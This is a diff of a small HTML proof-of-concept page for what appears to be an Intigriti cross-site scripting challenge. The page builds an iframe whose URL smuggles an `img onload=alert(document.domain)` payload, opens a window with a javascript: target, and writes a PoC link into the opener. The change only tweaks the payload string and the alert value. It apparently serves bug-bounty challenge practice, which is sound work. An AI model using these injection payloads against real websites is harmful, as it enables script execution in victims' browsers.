@@ -4,11 +4,11 @@
   <script>
     var iframe = document.createElement('iframe');
     iframe.name = 'helloworld';
-    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#\`);<img src=x onload=alert(document.domain)>;'
+    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#\`);<img src=x onload=alert(document.domain)>;?'
 //     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
     iframe.onclick = function(e){
         var myWindow = window.open(this.contentWindow.name, 'javascript:alert(document.domain)');
-        myWindow.opener.document.write('<a href="https://challenge.intigriti.io/" target="javascript:alert(1)">PoC</a>')
+        myWindow.opener.document.write('<a href="https://challenge.intigriti.io/" target="javascript:alert(666)">PoC</a>')
 // //         var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge1.png', '_blank', 'toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400');
 //         myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
     }
